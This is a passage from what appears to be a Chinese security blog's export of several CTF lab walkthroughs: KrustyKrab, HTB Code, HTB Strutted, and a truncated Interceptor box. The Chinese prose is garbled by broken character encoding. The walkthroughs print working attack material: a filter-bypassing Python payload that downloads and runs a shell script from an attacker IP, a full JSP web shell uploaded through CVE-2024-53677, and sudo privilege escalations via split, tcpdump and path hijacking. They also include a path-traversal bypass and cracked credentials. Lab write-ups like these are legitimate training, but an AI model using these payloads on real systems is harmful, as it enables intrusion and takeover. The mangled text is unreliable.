try_login.text:\rprint(f\u0026#34;Login successful with password: {password}\u0026#34;)\rbreak ä¹Ÿå¯ä»¥å°è¯•å¼±å£ä»¤ï¼Œä»–çš„ç”¨æˆ·åæ˜¯spongebobï¼Œå› æ­¤å°è¯•å¯†ç ä¸ºsquarepantsï¼ŒæˆåŠŸç™»å½•ï¼ï¼\nspongebobï¼šsquarepants SQL Injection #\ræŸ¥çœ‹ç”¨æˆ·ä¿¡ç®±ï¼Œå‘ç°äº†ä¸€ä¸ªç±»ä¼¼äºç®¡ç†å‘˜çš„ç”¨æˆ·ï¼šAdministratro\nåŒæ—¶ä¸‹æ–¹å­˜åœ¨ä¸€ä¸ªSendçš„è¯·æ±‚ï¼Œç”¨äºå‘é€ä¿¡æ¯ã€‚\nåˆ°è¿™é‡Œå¦‚æœä½ æƒ³çš„æ˜¯XSSæ¥è·å–åˆ°ç®¡ç†å‘˜çš„èº«ä»½å‡­è¯ï¼Œé‚£ä¹ˆä½ çš„æ€è·¯æ˜¯æ­£å¸¸çš„ã€‚ä½†æ˜¯è¿™é‡Œå¹¶ä¸ä¼šæœ‰ä»»ä½•å›åº”ã€‚\næ³¨æ„åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªä¿®æ”¹ç”¨æˆ·ä¿¡æ¯çš„è¡¨å•ï¼ŒåŒæ—¶è¿˜å¯ä»¥ä¸Šä¼ å¤´åƒã€‚\nä¸Šä¼ ä¸€ä¸ªæœ¨é©¬ï¼Ÿï¼Ÿï¼Ÿæ€è·¯å¾ˆå¥½ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿä¸æ˜¯ğŸ˜‚\næŠ“åŒ…å‘ç°å¯ä»¥ä¿®æ”¹ç”¨æˆ·åï¼Œå¯¼è‡´å…¶ä»–ç”¨æˆ·çš„å¯†ç è¢«ä¿®æ”¹ã€‚\nç™»å½•ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œåå¼¹shellæ‹¿åˆ°www-data\nOwn KrustyKrab #\rwww-data@KrustyKrab:/var/www/html/finexo/admin_dashborad$ sudo -l\rsudo -l\rsudo: unable to resolve host KrustyKrab: Temporary failure in name resolution\rMatching Defaults entries for www-data on KrustyKrab:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\ruse_pty\rUser www-data may run the following commands on KrustyKrab:\r(KrustyKrab) NOPASSWD: /usr/bin/split å¯ä»¥çœ‹åˆ°å­˜åœ¨ä»¥KrustyKrabèº«ä»½è¿è¡Œsplitå‘½ä»¤\nsplit | GTFOBins sudo -u KrustyKrab /usr/bin/split --filter=/bin/sh /dev/stdin æ‹¿åˆ°User.txt\nå†™å…¥sshå¯†é’¥è¿›è¡Œç™»å½•\nOwn SpongeBob #\ræŸ¥çœ‹sudo -l\nKrustyKrab@KrustyKrab:~$ sudo -l\rsudo: unable to resolve host KrustyKrab: Temporary failure in name resolution\rMatching Defaults entries for KrustyKrab on KrustyKrab:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser KrustyKrab may run the following commands on KrustyKrab:\r(spongeBob) NOPASSWD: /usr/bin/ttteeesssttt å°†è¿™ä¸ªæ–‡ä»¶å¤åˆ¶å‡ºæ¥è¿›è¡Œåç¼–è¯‘æŸ¥çœ‹\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\runsigned int v3; // eax\rconst char *v4; // rax\rchar s[11]; // [rsp+5h] [rbp-5Bh] BYREF\rint v7[12]; // [rsp+10h] [rbp-50h] BYREF\rint n; // [rsp+40h] [rbp-20h]\rint v9; // [rsp+44h] [rbp-1Ch]\rint m; // [rsp+48h] [rbp-18h]\rint v11; // [rsp+4Ch] [rbp-14h]\rint k; // [rsp+50h] [rbp-10h]\rint v13; // [rsp+54h] [rbp-Ch]\rint j; // [rsp+58h] [rbp-8h]\rint i; // [rsp+5Ch] [rbp-4h]\rv3 = time(0LL);\rsrand(v3);\rfor ( i = 0; i \u0026lt;= 9; ++i )\rv7[i] = i;\rshuffle(v7, 10LL);\rputs(\u0026#34;\\nSpongebob forgot how to make Krabby Patty, You need to help him!\u0026#34;);\rputs(\u0026#34;\\nCurrent shuffled recipe order:\u0026#34;);\rfor ( j = 0; j \u0026lt;= 9; ++j )\rprintf(\u0026#34;%c: %s\\n\u0026#34;, (unsigned int)labels[j], (\u0026amp;ingredients)[v7[j]]);\rputs(\u0026#34;\\nPlease enter the correct order using letters (e.g., ABCDEFGHIJ):\u0026#34;);\rwhile ( 1 )\r{\rwhile ( 1 )\r{\rprintf(\u0026#34;Enter 10 letters (A-J): \u0026#34;);\r__isoc99_scanf(\u0026#34;%10s\u0026#34;, s);\rwhile ( getchar() != 10 )\r;\rif ( strlen(s) == 10 )\rbreak;\rputs(\u0026#34;Error: You must enter exactly 10 letters!\u0026#34;);\r}\rv13 = 1;\rfor ( k = 0; k \u0026lt;= 9; ++k )\r{\rif ( s[k] \u0026lt;= 64 || s[k] \u0026gt; 74 )\r{\rv13 = 0;\rbreak;\r}\r}\rif ( v13 )\rbreak;\rputs(\u0026#34;Error: Contains invalid characters! Use only A-J.\u0026#34;);\r}\rv11 = 1;\rfor ( m = 0; m \u0026lt;= 9; ++m )\r{\rv9 = -1;\rfor ( n = 0; n \u0026lt;= 9; ++n )\r{\rif ( labels[n] == s[m] )\r{\rv9 = n;\rbreak;\r}\r}\rif ( v9 == -1 || m != v7[v9] )\r{\rv11 = 0;\rbreak;\r}\r}\rif ( v11 )\rv4 = \u0026#34;Validation successful! Perfect Krabby Patty!\u0026#34;;\relse\rv4 = \u0026#34;Validation failed! This is not the correct recipe!\u0026#34;;\rprintf(\u0026#34;\\n%s\\n\u0026#34;, v4);\rif ( v11 )\rsystem(\u0026#34;/bin/bash -p\u0026#34;);\rreturn 0;\r} ä¼¼ä¹æ˜¯è¦åšä¸€ä¸ªèŸ¹é»„å ¡ï¼Ÿä½†æ˜¯æ²¡æœ‰é…æ–¹æ€ä¹ˆåŠå‘¢ï¼ŒæŸ¥çœ‹åˆ°ç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ªGIFå›¾ç‰‡æ ¼å¼çš„æ–‡ä»¶\nä¿®æ”¹ä¸€ä¸‹åç¼€åå¯ä»¥çœ‹åˆ°å›¾ç‰‡å†…å®¹\nè¿™æ˜¯æµ·ç»µå®å®è¢«æµ·éœ¸ç‹æäº†çš„é‚£ä¸€é›†ï¼Œæµ·éœ¸ç‹æŠŠè…Œé‡èœæ”¾åœ¨äº†èˆŒå¤´ä¸‹é¢ï¼Œç„¶åéª—æµ·ç»µå®å®è¯´ä»–æ²¡æœ‰æ”¾è…Œé‡èœï¼Œæœ€åç”šè‡³éƒ½å¿˜è®°äº†æ€ä¹ˆåšèŸ¹é»„å ¡ï¼Œå¥½åœ¨ä»–æœ€åå‡­å€Ÿæ½œæ„è¯†æƒ³èµ·æ¥äº†æ€ä¹ˆåšã€‚\nå› æ­¤é…æ–¹çš„é¡ºåºå°±æœ‰äº†\nåº•éƒ¨é¢åŒ… è‚‰é¥¼ ç”Ÿèœ å¥¶é…ª æ´‹è‘± è¥¿çº¢æŸ¿ ç•ªèŒ„é…± èŠ¥æœ« è…Œé‡èœ é¡¶éƒ¨é¢åŒ… å¯ä»¥çœ‹åˆ°æˆåŠŸå¸®æµ·ç»µå®å®æ‰¾å›äº†è‡ªæˆ‘ï¼ï¼ï¼\nOwn Squidward #\rå¯ä»¥æŸ¥çœ‹åˆ°æ˜¯éœ€è¦key1å’Œkey2è¿èµ·æ¥è¿›è¡Œmd5åŠ å¯†\næŸ¥çœ‹key2.jpeg\nå¦‚æœä½ è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªmiscçš„è¯ï¼Œé‚£å°±æƒ³éº»çƒ¦äº†ã€‚\nå®é™…ä¸Šç« é±¼å“¥çš„å¯†ç å°±æ˜¯ä¸¤ä¸ªæ–‡ä»¶çš„md5å€¼æ‹¼èµ·æ¥å†æ¬¡è¿›è¡Œmd5\nRoot #\ræ³¨æ„åˆ°å½“å‰æ–‡ä»¶å¤¹ä¸­æœ‰ä¸€ä¸ªlaststepæ–‡ä»¶ï¼Œå¹¶ä¸”è®¾ç½®äº†SUID\nè¿›è¡Œåç¼–è¯‘ï¼Œéå¸¸ç®€å•\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rsetgid(0);\rsetuid(0);\rsystem(\u0026#34;cat /etc/shadow\u0026#34;);\rreturn 0;\r} ä½ æˆ–è®¸å·²ç»çŒœåˆ°äº†è¦ç”¨åˆ°è·¯å¾„åŠ«æŒäº†å§\næ³¨æ„è¿™é‡Œè¦ç»™chmod +xæ‰§è¡Œæƒé™å“¦\nexport PATH=.:$PATH Summary #\rUserï¼šä»ç™»å½•é¡µé¢å¼±å£ä»¤è¿›å…¥åå°ï¼Œé€šè¿‡ä¿®æ”¹ä»»æ„ç”¨æˆ·å¯†ç ç™»å½•åˆ°ç®¡ç†å‘˜åå°ï¼Œæ‰§è¡Œå‘½ä»¤æ‹¿åˆ°www-dataæƒé™ï¼Œé€šè¿‡splitæ‹¿åˆ°KrustyKrabç”¨æˆ·ã€‚\nRootï¼šé€†å‘åˆ†æåŠ ä¸Šç»™å‡ºçš„GIFå›¾ç‰‡æç¤ºï¼Œè¾“å…¥æ­£ç¡®åºåˆ—å¯ä»¥æ‹¿åˆ°spongebobçš„æƒé™ã€‚å¯¹æ–‡ä»¶è¿›è¡Œmd5åŠ å¯†æ“ä½œæ‹¿åˆ°squidwardå¯†ç ï¼Œæœ€åé€šè¿‡è·¯å¾„åŠ«æŒææƒåˆ°Root\n","date":"2025-03-27","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-krustykrab/","section":"Posts","summary":"","title":"HackMyVM-KrustyKrab","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Code â¯ nmap code.htb -sV -A PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)\r| 256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)\r|_ 256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)\r5000/tcp open http Gunicorn 20.0.4\r|_http-title: Python Code Editor\r|_http-server-header: gunicorn/20.0.4 Own www-data #\rSSTI æ³¨å…¥ - Hello CTF è¿›å…¥åˆ°5000ç«¯å£æ˜¯ä¸€ä¸ªpythonä»£ç æ‰§è¡Œçª—å£\nè¿‡æ»¤äº†importå’Œä¸€äº›å…³é”®è¯ï¼Œå°è¯•å¯»æ‰¾evalå‡½æ•°\nfor i in range(500):\rtry:\rx = \u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[i].__init__.__globals__[\u0026#39;__buil\u0026#39;+\u0026#39;tins__\u0026#39;]\rif \u0026#39;ev\u0026#39;+\u0026#39;al\u0026#39; in x:\rprint(i)\rexcept Exception as e:\rcontinue ç”¨åŠ å·æ¥è¿›è¡Œç»•è¿‡ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤\nprint(\u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__[\u0026#39;__buil\u0026#39;+\u0026#39;tins__\u0026#39;][\u0026#39;ev\u0026#39;+\u0026#39;al\u0026#39;](\u0026#39;__imp\u0026#39;+\u0026#39;ort__(\u0026#34;o\u0026#39;+\u0026#39;s\u0026#34;).po\u0026#39;+\u0026#39;pen(\u0026#34;ls /\u0026#34;).re\u0026#39;+\u0026#39;ad()\u0026#39;)) print(\u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__[\u0026#39;__buil\u0026#39;+\u0026#39;tins__\u0026#39;][\u0026#39;ev\u0026#39;+\u0026#39;al\u0026#39;](\u0026#39;__imp\u0026#39;+\u0026#39;ort__(\u0026#34;o\u0026#39;+\u0026#39;s\u0026#34;).po\u0026#39;+\u0026#39;pen(\u0026#34;wget 10.10.xx.xx/shell.sh -O /tmp/shell.sh\u0026#34;).re\u0026#39;+\u0026#39;ad()\u0026#39;))\rprint(\u0026#39;\u0026#39;.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__[\u0026#39;__buil\u0026#39;+\u0026#39;tins__\u0026#39;][\u0026#39;ev\u0026#39;+\u0026#39;al\u0026#39;](\u0026#39;__imp\u0026#39;+\u0026#39;ort__(\u0026#34;o\u0026#39;+\u0026#39;s\u0026#34;).po\u0026#39;+\u0026#39;pen(\u0026#34;bash /tmp/shell.sh\u0026#34;).re\u0026#39;+\u0026#39;ad()\u0026#39;)) å¾—åˆ°åå¼¹Shell\næ‹¿åˆ°User\nå½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥é€‰æ‹©ä¸€ä¸ªæ›´åŠ ä¼˜é›…çš„æ–¹å¼\nobj = globals()[\u0026#34;__buil\u0026#34; + \u0026#34;tins__\u0026#34;][\u0026#39;ev\u0026#39;+\u0026#39;al\u0026#39;]\rresult = obj(\u0026#39;__imp\u0026#39;+\u0026#39;ort__(\u0026#34;o\u0026#39;+\u0026#39;s\u0026#34;).pop\u0026#39;+\u0026#39;en(\u0026#34;ls\u0026#34;).rea\u0026#39;+\u0026#39;d()\u0026#39;)\rprint(result) Own Martin #\råœ¨app/instanceç›®å½•ä¸‹å‘ç°ä¸€ä¸ªdatabase.dbï¼Œå¾—åˆ°martinçš„å¯†ç hash\n[root@kali] /home/kali/Code â¯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 Using default input encoding: UTF-8\rLoaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])\rWarning: no OpenMP support for this hash type, consider --fork=4\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rXXXXXXXXXXXXXXXXX (?) Root #\ræŸ¥çœ‹sudo -l\nmartin@code:~$ sudo -l\rMatching Defaults entries for martin on localhost:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser martin may run the following commands on localhost:\r(ALL : ALL) NOPASSWD: /usr/bin/backy.sh æŸ¥çœ‹è„šæœ¬å†…å®¹\n#!/bin/bash\rif [[ $# -ne 1 ]]; then\r/usr/bin/echo \u0026#34;Usage: $0 \u0026lt;task.json\u0026gt;\u0026#34;\rexit 1\rfi\rjson_file=\u0026#34;$1\u0026#34;\rif [[ ! -f \u0026#34;$json_file\u0026#34; ]]; then\r/usr/bin/echo \u0026#34;Error: File \u0026#39;$json_file\u0026#39; not found.\u0026#34;\rexit 1\rfi\rallowed_paths=(\u0026#34;/var/\u0026#34; \u0026#34;/home/\u0026#34;)\rupdated_json=$(/usr/bin/jq \u0026#39;.directories_to_archive |= map(gsub(\u0026#34;\\\\.\\\\./\u0026#34;; \u0026#34;\u0026#34;))\u0026#39; \u0026#34;$json_file\u0026#34;)\r/usr/bin/echo \u0026#34;$updated_json\u0026#34; \u0026gt; \u0026#34;$json_file\u0026#34;\rdirectories_to_archive=$(/usr/bin/echo \u0026#34;$updated_json\u0026#34; | /usr/bin/jq -r \u0026#39;.directories_to_archive[]\u0026#39;)\ris_allowed_path() {\rlocal path=\u0026#34;$1\u0026#34;\rfor allowed_path in \u0026#34;${allowed_paths[@]}\u0026#34;; do\rif [[ \u0026#34;$path\u0026#34; == $allowed_path* ]]; then\rreturn 0\rfi\rdone\rreturn 1\r}\rfor dir in $directories_to_archive; do\rif ! is_allowed_path \u0026#34;$dir\u0026#34;; then\r/usr/bin/echo \u0026#34;Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.\u0026#34;\rexit 1\rfi\rdone\r/usr/bin/backy \u0026#34;$json_file\u0026#34; è„šæœ¬çš„å†…å®¹å¦‚ä¸‹ï¼š\næ£€æŸ¥å‚æ•°ï¼šå¦‚æœæ²¡æœ‰ä¼ å…¥æ–‡ä»¶å‚æ•°ï¼Œè¾“å‡ºç”¨æ³•è¯´æ˜å¹¶é€€å‡ºã€‚\næ–‡ä»¶å­˜åœ¨æ€§æ£€æŸ¥ï¼šæ£€æŸ¥ task.json æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè‹¥ä¸å­˜åœ¨åˆ™æŠ¥é”™é€€å‡ºã€‚\nå¤„ç† JSON æ–‡ä»¶ï¼šä½¿ç”¨ jq ç§»é™¤ directories_to_archive ä¸­çš„ ../ï¼Œå¹¶æ›´æ–°æ–‡ä»¶å†…å®¹ã€‚\néªŒè¯ç›®å½•ï¼šéå† directories_to_archive ä¸­çš„ç›®å½•ï¼Œç¡®ä¿å®ƒä»¬åœ¨å…è®¸çš„è·¯å¾„ /var/ æˆ– /home/ ä¸‹ã€‚\næ‰§è¡Œå¤‡ä»½ï¼šå¦‚æœæ‰€æœ‰ç›®å½•éªŒè¯é€šè¿‡ï¼Œæ‰§è¡Œ backy.sh å¤‡ä»½æ“ä½œã€‚\nè¿™é‡Œå¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡**../ï¼Œåˆ›å»ºä¸€ä¸ªtask.json**\n{\r\u0026#34;directories_to_archive\u0026#34;: [\r\u0026#34;/home/..././root/\u0026#34; ],\r\u0026#34;destination\u0026#34;: \u0026#34;/tmp\u0026#34;\r} ç„¶åæ‰§è¡Œ\nsudo /usr/bin/backy.sh task.json å½“ç„¶ï¼Œä¹Ÿå¯ä»¥æ‹¿åˆ°SSHå¯†é’¥\nSummary #\rUserï¼šç±»ä¼¼äºSSTIæˆ–è€…Pyjailï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œç›´æ¥å°±æ‹¿åˆ°äº†user.txtã€‚\nRootï¼šåœ¨database.dbä¸­æ‹¿åˆ°martinçš„å¯†ç è¿›è¡Œè§£å¯†ï¼Œé€šè¿‡åŒå†™ç»•è¿‡ç›®å½•é™åˆ¶ï¼Œå¤‡ä»½rootæ–‡ä»¶å¤¹ï¼Œå¯ä»¥æ‹¿åˆ°rootå¯†é’¥ã€‚\n","date":"2025-03-23","externalUrl":null,"permalink":"/posts/2025/03/htb-code/","section":"Posts","summary":"","title":"HTB-Code","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Strutted â¯ nmap strutted.htb -sV PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r80/tcp open http nginx 1.18.0 (Ubuntu) CVE-2024-53677Â #\rå­˜åœ¨ä¸€ä¸ªDownloadè·¯ç”±å¯ä»¥ä¸‹è½½åˆ°ç½‘ç«™æºç \næŸ¥çœ‹pom.xmlå‘ç°ä½¿ç”¨çš„æ˜¯struts2 6.3.0.1\nApache Struts2æ–‡ä»¶ä¸Šä¼ ç»•è¿‡è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´(CVE-2024-53677) - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\næ·±åº¦è§£æ Struts2 æ¼æ´ CVE - 2024 - 53677ï¼šåŸç†ã€åˆ©ç”¨ä¸ä¿®å¤å…¨æ”»ç•¥\néšæ„ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œå¯ä»¥çœ‹åˆ°å“åº”ä¸­æœ‰å­˜å‚¨è·¯å¾„\nPOST /upload.action HTTP/1.1\rHost: strutted.htb\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate, br\rContent-Type: multipart/form-data; boundary=---------------------------115439595428497934603121522453\rContent-Length: 1253\rOrigin: http://strutted.htb\rConnection: keep-alive\rReferer: http://strutted.htb/upload.action\rCookie: JSESSIONID=160DD7DCBCF29E8A673300CA18537126\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\r-----------------------------115439595428497934603121522453\rContent-Disposition: form-data; name=\u0026#34;Upload\u0026#34;; filename=\u0026#34;test.jpg\u0026#34;\rContent-Type: image/jpeg\rGIF89a\r\u0026lt;%@ page import=\u0026#34;java.io.*, java.util.*, java.net.*\u0026#34; %\u0026gt;\r\u0026lt;%\rString action = request.getParameter(\u0026#34;action\u0026#34;);\rString output = \u0026#34;\u0026#34;;\rtry {\rif (\u0026#34;cmd\u0026#34;.equals(action)) {\rString cmd = request.getParameter(\u0026#34;cmd\u0026#34;);\rif (cmd != null) {\rProcess p = Runtime.getRuntime().exec(cmd);\rBufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\rString line;\rwhile ((line = reader.readLine()) != null) {\routput += line + \u0026#34;\\\\n\u0026#34;;\r}\rreader.close();\r}\r} else {\routput = \u0026#34;Unknown action.\u0026#34;;\r}\r} catch (Exception e) {\routput = \u0026#34;Error: \u0026#34; + e.getMessage();\r}\rresponse.setContentType(\u0026#34;text/plain\u0026#34;);\rout.print(output);\r%\u0026gt;\r%\u0026gt;\r-----------------------------115439595428497934603121522453\rContent-Disposition: form-data; name=\u0026#34;upload\u0026#34;;name=\u0026#34;top.UploadFileName\u0026#34;\r../../shell.jsp\r-----------------------------115439595428497934603121522453-- æ³¨æ„è¿™é‡Œçš„æœ€ä¸Šé¢çš„uploadçš„éœ€è¦é¦–å­—æ¯å¤§å†™\nå†™ä¸€ä¸ªåå¼¹shellï¼Œæ‹¿åˆ°tomcatæƒé™\nåœ¨tomcat-users.xmlä¸­æ‹¿åˆ°å¯†ç ï¼Œå¯ä»¥ç™»å½•åˆ°jamesç”¨æˆ·\nRoot #\ræŸ¥çœ‹sudo -l\njames@strutted:~$ sudo -l\rMatching Defaults entries for james on localhost:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser james may run the following commands on localhost:\r(ALL) NOPASSWD: /usr/sbin/tcpdump tcpdump | GTFOBins james@strutted:~$ COMMAND=\u0026#39;chmod u+s /bin/bash\u0026#39;\rjames@strutted:~$ TF=$(mktemp)\rjames@strutted:~$ echo \u0026#34;$COMMAND\u0026#34; \u0026gt; $TF\rjames@strutted:~$ chmod +x $TF\rjames@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\rtcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes\rMaximum file limit reached: 1\r1 packet captured\r4 packets received by filter\r0 packets dropped by kernel\rjames@strutted:~$ ls -al /bin/bash\r-rwsr-xr-x 1 root root 1396520 Mar 14 2024 /bin/bash\rjames@strutted:~$ Summary #\rUserï¼šé€šè¿‡Apache Strust2çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ‹¿åˆ°tomcatçš„shellï¼ŒæŸ¥çœ‹åˆ°å­˜åœ¨jamesç”¨æˆ·ï¼Œä½¿ç”¨é…ç½®æ–‡ä»¶ä¸­çš„å¯†ç æˆåŠŸsshç™»å½•ã€‚\nRootï¼štcpdumpææƒï¼Œæ¯”è¾ƒç®€å•ã€‚\n","date":"2025-03-22","externalUrl":null,"permalink":"/posts/2025/03/htb-strutted/","section":"Posts","summary":"","title":"HTB-Strutted","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/Interceptor â¯ nmap 192.168.56.123 -sV -A -p- PORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-title: Apache2 Debian Default Page: It works\r|_http-server-header: Apache/2.4.62 (Debian) Gobuster #\r[root@kali] /home/kali/Interceptor â¯ gobuster dir -u http://192.168.56.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.123\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.html (Status: 403) [Size: 279]\r/.php (Status: 403) [Size: 279]\r/index.html (Status: 200) [Size: 10701]\r/wordpress (Status: 301) [Size: 320] [--\u0026gt; http://192.168.56.123/wordpress/]\r/backup (Status: 301) [Size: 317] [--\u0026gt; http://192.168.56.123/backup/]\r/.html (Status: 403) [Size: 279]\r/.php (Status: 403) [Size: 279]\r/server-status (Status: 403) [Size: 279]\r/fping.php (Status: 200) [Size: 1958]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== Crack ZIP #\råœ¨**/backupé‡Œå‘ç°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œåº”è¯¥æ˜¯æ¶‰åŠåˆ°äº†/fping**è¿™ä¸ªè·¯ç”±çš„ã€‚\n[root@kali] /home/kali/Interceptor â¯ zip2john secure-backup.zip \u0026gt;\u0026gt;zip.hash â\rver 2.0 efh 5455 efh 7875 secure-backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=1692, decmplen=5976, crc=5ACA40D5 ts=509C cs=509c type=8\r[root@kali] /home/kali/Interceptor â¯ john zip.hash /usr/share/wordlists/rockyou.txt zxcvbnm (secure-backup.zip/source_code.php) source_code.phpğŸ‘‡\n\u0026lt;?php\rsession_start();\r$valid_username = \u0026#34;\u0026#34;;\r$valid_password = \u0026#34;\u0026#34;;\rif ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34; \u0026amp;\u0026amp; isset($_POST[\u0026#39;login\u0026#39;])) {\r$username = $_POST[\u0026#39;username\u0026#39;];\r$password = $_POST[\u0026#39;password\u0026#39;];\rif ($username === $valid_username \u0026amp;\u0026amp; $password === $valid_password) {\r$_SESSION[\u0026#39;logged_in\u0026#39;] = true;\r} else {\r$login_error = \u0026#34;Invalid credentials.\u0026#34;;\r}\r}\rif (isset($_GET[\u0026#39;logout\u0026#39;])) {\rsession_destroy();\rheader(\u0026#34;Location: \u0026#34; . $_SERVER[\u0026#39;PHP_SELF\u0026#39;]);\rexit;\r}\rif (!isset($_SESSION[\u0026#39;logged_in\u0026#39;]) || $_SESSION[\u0026#39;logged_in\u0026#39;] !== true) {\r?\u0026gt;\r\u0026lt;?php\rexit;\r}\rclass pingTest {\rpublic $ipAddress = \u0026#34;127.0.0.1\u0026#34;;\rpublic $isValid = False;\rpublic $output = \u0026#34;\u0026#34;;\rfunction validate() {\rif (!$this-\u0026gt;isValid) {\rif (filter_var($this-\u0026gt;ipAddress, FILTER_VALIDATE_IP) || strpos($this-\u0026gt;ipAddress, \u0026#34;;\u0026#34;) !== false) {\r$this-\u0026gt;isValid = True;\r}\r}\r$this-\u0026gt;ping();\r}\rpublic function ping() {\rif ($this-\u0026gt;isValid) {\r$this-\u0026gt;output = shell_exec(\u0026#34;ping -c 3 $this-\u0026gt;ipAddress\u0026#34;); }\r}\r}\rif (isset($_POST[\u0026#39;session_data\u0026#39;])) {\r$pingTest = @unserialize(urldecode($_POST[\u0026#39;session_data\u0026#39;]));\rif ($pingTest !== false \u0026amp;\u0026amp; is_object($pingTest)) {\r$pingTest-\u0026gt;validate();\r} else {\rdie(\u0026#34;Deserialization error.\u0026#34;);\r}\r} else {\r$pingTest = new pingTest;\r$pingTest-\u0026gt;validate();\r}\r?\u0026gt; å¯ä»¥çœ‹åˆ°ç™»å½•æˆåŠŸä¹‹åï¼Œå­˜åœ¨ä¸€ä¸ªshell_execçš„å‘½ä»¤æ‰§è¡Œï¼Œå¯ä»¥æ§åˆ¶å‚æ•°ï¼Œä½†æ˜¯å¹¶ä¸çŸ¥é“å…·ä½“çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ä¸è¿‡å¯ä»¥åœ¨æºç ä¸­çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªPOSTå˜é‡å¯ä»¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ\nWPscan #\ræ²¡æœ‰å‘ç°èƒ½å¤Ÿç›´æ¥åˆ©ç”¨çš„æ’ä»¶\nä½†æ˜¯å‘ç°äº†ä¸€ä¸ªè°ƒè¯•æ—¥å¿—\nä¼¼ä¹å­˜åœ¨ä¸€ä¸ªmyapiçš„æ’ä»¶ï¼Œè¿™ä¸ªæ’ä»¶æ²¡æœ‰è¢«WPscanæ£€æŸ¥åˆ°\nOwn www-data #\rç›´æ¥è®¿é—®å¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªdata.json\né‡Œé¢åŒ…å«äº†ä¸€äº›ç”¨æˆ·ä¿¡æ¯\nç»è¿‡å°è¯•ï¼Œä¸‹é¢æ˜¯å¯ä»¥ç™»å½•çš„ç”¨æˆ·\nsakura_rose:rWzB2jRpUefo 